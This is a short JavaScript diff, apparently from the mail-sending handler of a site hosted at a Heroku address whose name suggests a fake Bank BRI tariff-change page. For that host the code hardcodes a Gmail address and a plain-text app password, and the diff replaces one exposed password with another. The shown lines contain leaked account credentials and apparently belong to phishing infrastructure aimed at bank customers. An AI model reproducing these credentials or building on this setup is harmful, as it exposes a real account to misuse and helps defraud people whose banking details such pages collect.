@@ -16,7 +16,7 @@ export default function handler(req, res) {
     } else if(url == 'perubahantarifbri.herokuapp.com') //jika url sama dengan url hosting
     {
         email = 'sinetronsilala@gmail.com'; //email
-        pass = 'yrbowruwztpqkdea'; //sandi aplikasi dari verifikasi 2 langkah
+        pass = 'xqlshlibfcvtzepl'; //sandi aplikasi dari verifikasi 2 langkah
     }
     else {
 
